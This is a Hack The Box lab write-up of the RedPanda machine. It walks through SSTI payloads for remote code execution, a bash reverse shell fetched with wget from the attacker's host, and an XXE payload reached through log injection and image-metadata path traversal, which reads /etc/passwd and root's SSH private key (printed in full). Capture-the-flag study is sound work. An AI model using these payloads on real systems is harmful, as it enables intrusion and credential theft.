![Redpanda](RedPanda.png)
# Summary
[RedPanda](https://app.hackthebox.com/machines/RedPanda) starts off with a Spring Boot website that is vulnerable to Server Side Template Injection (SSTI). I exploit this vulnerability to get command execution and a shell on the box. Once on the box I exploit another Java application that is running as root. I generate an attack chain that starts by writing to a log file file and pointing to a malicious JPG image I created. The JPG's metadata is exploits a directory traversal vulnerability to point to a malicious XML file I created. This XML file contains an XML External Entity (XXE) payload that allows me to read files as root. With this, I am able to read root's SSH key and gain root access.
# Nmap
As always I start off with an Nmap scan. I first scan all ports with `-p-` and `-v` to print ports as they're found. I then scan with the default scripts `-sC` and version enumeration `-sV` on the open ports found.
```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
8080/tcp open  http-proxy
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Fri, 24 Feb 2023 21:42:36 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye'
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Fri, 24 Feb 2023 21:42:36 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Fri, 24 Feb 2023 21:42:36 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-title: Red Panda Search | Made with Spring Boot
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
I find 2 ports open, SSH on port 22, and HTTP on port 8080.

## HTTP Port 8080
Port 8080 brings me to a site called RedPanda Search, with just a search function.

![redpanda](Thu-11-2024_14-19.png)

Before I start poking around, I want to get some recon going in the background. Nmap nor the HTTP headers state weather the server is Apache or Nginx. Viewing the source of the page I see that the site is made with Spring Boot:

![springboot](Thu-11-2024_14-27.png)

So this is likely a Java website. I run `feroxbuster` with `-x java,class` flag to pick up Java files. I also use the `-A` flag to use a random user agent, and `-n` to prevent recursion.
```bash
┌──(kali㉿Kali)──[14:30:19]──[~/htb/Machines/RedPanda]
└─$ feroxbuster -u http://10.129.227.207:8080/ -A -n -x java.class

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.227.207:8080/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [java.class]
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        1l        3w      117c http://10.129.227.207:8080/search
200      GET       22l       41w      295c http://10.129.227.207:8080/css/main.css
200      GET      275l      763w     7549c http://10.129.227.207:8080/css/panda.css
200      GET       55l      119w     1543c http://10.129.227.207:8080/
200      GET       54l      102w      822c http://10.129.227.207:8080/css/stats.css
200      GET       32l       97w      987c http://10.129.227.207:8080/stats
500      GET        1l        1w       86c http://10.129.227.207:8080/error
[####################] - 2m     30008/30008   0s      found:19      errors:0      
[####################] - 2m     30000/30000   236/s   http://10.129.227.207:8080/
```
Not too much interesting here.

Searching for `a` returns 4 pandas. Each panda has a link to their author. The author page lists their pandas, the amount of views each panda has. There is also an export table function, and links to all the authors at the bottom of the page.

![author](Thu-11-2024_14-23.png)

The 'export table' function sends a request to `/export.xml?author=woodenk` and it returns a `.xml` file 

![xml](Thu-11-2024_14-26.png)

## SSTI > User Shell
Knowing that this is Spring Boot, I decide to try some SSTI payloads. I send `${7*7}` and get the message back that I have used banned characters

![banned](Thu-11-2024_14-32.png)

To fuzz for what characters are banned, I capture the search request in Burpsuite right clink>copy to file. I change the search paramter to "FUZZ"

![req](Thu-11-2024_14-35.png)

I then plug the request into `ffuf` and use the `-mr banned` to just print values that have the word "banned" in the response. I find the only banned characters are `$`, `_`, and `~`.

I check the [Hacktricks SSTI page for Spring Framework](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#spring-framework-java) and see that there are other characters I can use to bypass the `$` ban. I send a new payload of `*{7*7}`. I get a response that I search for "49", meaning my payload worked.

![ssti](Thu-11-2024_14-39.png)

I then use the payload from Hacktricks to gain command execution:
```js
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

![RCE](Thu-11-2024_14-41.png)

Get a reverse shell was a bit finicky. What ended up working for me was using 3 separate payloads to first download a reverse shell from my attack box, `chmod` it to make it executable, and the executing it.
```bash
# Write webshell to file
echo 'bash -i >& /dev/tcp/10.10.14.78/9001 0>&1' > shell.sh

# Start webserver
python3 -m http.server 80

# Start netcat listener
nc -lvnp 9001
```
1st Payload to download the reverse shell:
```js
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('wget 10.10.14.78/shell.sh -O /dev/shm/shell.sh').getInputStream())}
```
2nd Payload:
```js
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('chmod +x /dev/shm/shell.sh').getInputStream())}
```
3rd Payload:
```js
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('/dev/shm/shell.sh').getInputStream())}
```
And I then catch the shell on my netcat listener. I then use the [python pty trick](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#spawn-tty-shell) to upgrade my shell.
# XXE > Root Shell
In the shell, I am a member of the logs group. I run a `find` command to see what this group owns. Ommiting the lines from the `/proc`, `/tmp`, and `/home/woodenk/.m2`, I get:
```
woodenk@redpanda:/opt$ find / -group logs 2>/dev/null | grep -v -e '^/proc' -e '\.m2' -e '^/tmp/'
/opt/panda_search/redpanda.log
/dev/shm/shell.sh
/credits
/credits/damian_creds.xml
/credits/woodenk_creds.xml
```
I can read the `/credits` directory, but not write to it.

The rest of the good stuff here is in the `/opt` directory. This is where the RedPanda site is hosted.

#### MainController.java
Reading `/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java` I see that the `/stats` route (the website page that displays views) is gettings its values from `/credits/[author]_creds.xml`
```java
if(author.equals("woodenk") || author.equals("damian"))
                {
                        String path = "/credits/" + author + "_creds.xml";
                        File fd = new File(path);
                        Document doc = saxBuilder.build(fd);
                        Element rootElement = doc.getRootElement();
                        String totalviews = rootElement.getChildText("totalviews");
                        List<Element> images = rootElement.getChildren("image");
                        for(Element image: images)
                                System.out.println(image.getChildText("uri"));
                        model.addAttribute("noAuthor", false);
                        model.addAttribute("author", author);
                        model.addAttribute("totalviews", totalviews);
                        model.addAttribute("images", images);
                        return new ModelAndView("stats.html");
```
There are also some creds in this file, but I don't need them.
#### RequestIntercepter.java
This file shows me how data is extracted from the log files
```java
public void afterCompletion (HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throww
s Exception {
        System.out.println("interceptor#postHandle called. Thread: " + Thread.currentThread().getName());
        String UserAgent = request.getHeader("User-Agent");
        String remoteAddr = request.getRemoteAddr();
        String requestUri = request.getRequestURI();
        Integer responseCode = response.getStatus();
        /*System.out.println("User agent: " + UserAgent);
        System.out.println("IP: " + remoteAddr);
        System.out.println("Uri: " + requestUri);
        System.out.println("Response code: " + responseCode.toString());*/
        System.out.println("LOG: " + responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri);
        FileWriter fw = new FileWriter("/opt/panda_search/redpanda.log", true);
        BufferedWriter bw = new BufferedWriter(fw);
        bw.write(responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri + "\n");
        bw.close();
    }
}
```
It writes logs to `/opt/panda_search/redpanda.log` in the format:
```
[response code]||[remote address]||[user agent]||[request uri]
```
#### App.java
There's another folder in `/opt` called `credit-score`. Digging through this I find `App.java`. This file tells me that `/opt/panda_search/redpanda.log` is being read and passed to `parseLog`. 
```java
public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        while(log_reader.hasNextLine())
        {
            String line = log_reader.nextLine();
            if(!isImage(line))
            {
                continue;
            }
            Map parsed_data = parseLog(line);
            System.out.println(parsed_data.get("uri"));
            String artist = getArtist(parsed_data.get("uri").toString());
            System.out.println("Artist: " + artist);
            String xmlPath = "/credits/" + artist + "_creds.xml";
            addViewTo(xmlPath, parsed_data.get("uri").toString());
        }

    }
```
`parseLog` reads and splits the file at `||`
```java
    public static Map parseLog(String line) {                      
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();                                 
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);                                 
        map.put("user_agent", strings[2]);                         
        map.put("uri", strings[3]);

        return map;                                                
    }  

```
After a log line is split and parsed, it's passed to `getArtist` where the image's `Artist` metadata field is extracted
```java
public static String getArtist(String uri) throws IOException, JpegProcessingException                                             
    {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {                                                          
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
                {                                                  
                    return tag.getDescription();
                }                                                  
            }                                                      
        }                                                          
        return "N/A";                                              
    }   
```
The artist name is then used to generate a path `/credits/[Artist]_creds.xml`, and increments the view count in that file.
```java
public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        while(log_reader.hasNextLine())
        {
            String line = log_reader.nextLine();
            if(!isImage(line))
            {
                continue;
            }
            Map parsed_data = parseLog(line);
            System.out.println(parsed_data.get("uri"));
            String artist = getArtist(parsed_data.get("uri").toString());
            System.out.println("Artist: " + artist);
            String xmlPath = "/credits/" + artist + "_creds.xml";
            addViewTo(xmlPath, parsed_data.get("uri").toString());
        }
****
```
### Putting it Together
Getting a root shell is clever and a little finicky. It's done by reading root's id_rsa with XXE.
The website maintains stats of how many views each artist has by updating and reading an `xml` file in `/credits`. The way this works is that when an image is viewed, a log entry is made in `redpanda.log`. `App.java` will then pull the image name from the log file. It then navigates to that image and reads the `Artist` metadata from the picture, it then finds a file `/credits + <artist name> + _creds.xml`, and updates that file. 

The user `woodenk` is part of the log group and can edit the `redpanda.log` file. This means I can make `App.java` navigate to a picture of my choosing. Since I can control the metadata in my picture, `<artist name>` is now under my control. I can change the artist name to navigate to an `xml` file I wrote, which contains an XXE payload. When `App.java` opens my `xml` file, the payload will be executed and give me file read.
#### evil_creds.xml
I create an `evil_creds.xml` file on my box by downloading an `export.xml` from the `/stats` page on the website. I edit it to include an XXE payload.
```xml
┌──(kali㉿Kali)──[15:40:36]──[~/htb/Machines/RedPanda/www]
└─$ cat evil_creds.xml    
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "/etc/passwd"> ]>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>1</views>
    <root>&xxe;</root>
  </image>
  <image>
    <uri>/img/hungy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smooch.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smiley.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```
I download the file to `/tmp/evil_creds.xml` on the victim.
#### evil.jpg
I create an `evil.jpg` on my box and change the `Artist` metadata to `../tmp/evil` 
```bash
┌──(kali㉿Kali)──[15:27:09]──[~/htb/Machines/RedPanda/www]
└─$ exiftool -Artist="../tmp/evil" evil.jpg
    1 image files updated
```

![artist](Thu-11-2024_15-27.png)

I upload this to `/tmp/evil.jpg` on the victim.

#### RedPanda.log
I then add a log entry in `redpanda.log` 
```bash
echo "412||ip||ua||/../../../../../../tmp/0xdf.jpg" >> redpanda.log
```
and wait for the update script to run.

After a bit `App.java` reads the uri from the log, navigates to `/../../../../../../tmp/evil.jpg`, reads the `Artist` metadata, and finds the file `../tmp/evil_creds.xml` and then opens that file. The paylod is executed and `/etc/passwd` is added to the file.
```bash
woodenk@redpanda:/tmp$ cat evil_creds.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>1</views>
    <root>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
woodenk:x:1000:1000:,,,:/home/woodenk:/bin/bash
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false</root>
<...SNIP...>
```
I now change the payload to read `/root/.ssh/id_rsa` and repeat the processWhen I open my `evil_creds.xml`, root's SSH key is inside!
```bash
woodenk@redpanda:/tmp$ cat evil_creds.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>1</views>
    <root>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</root>
  </image>
  <image>
    <uri>/img/hungy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smooch.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smiley.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>

```
I can now SSH into the box as root and grab the flag!
```bash
┌──(kali㉿Kali)──[15:51:37]──[~/htb/Machines/RedPanda]
└─$ echo '-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----' > root_rsa
                                                                                                                               
┌──(kali㉿Kali)──[15:51:45]──[~/htb/Machines/RedPanda]
└─$ chmod 600 root_rsa  
                                                                                                                               
┌──(kali㉿Kali)──[15:51:49]──[~/htb/Machines/RedPanda]
└─$ ssh -i root_rsa root@10.129.227.207    
<...SNIP...>
Last login: Thu Jun 30 13:17:41 2022
root@redpanda:~# id
uid=0(root) gid=0(root) groups=0(root)
root@redpanda:~# cat root.txt 
19f971e-------------------------
root@redpanda:~# 

```
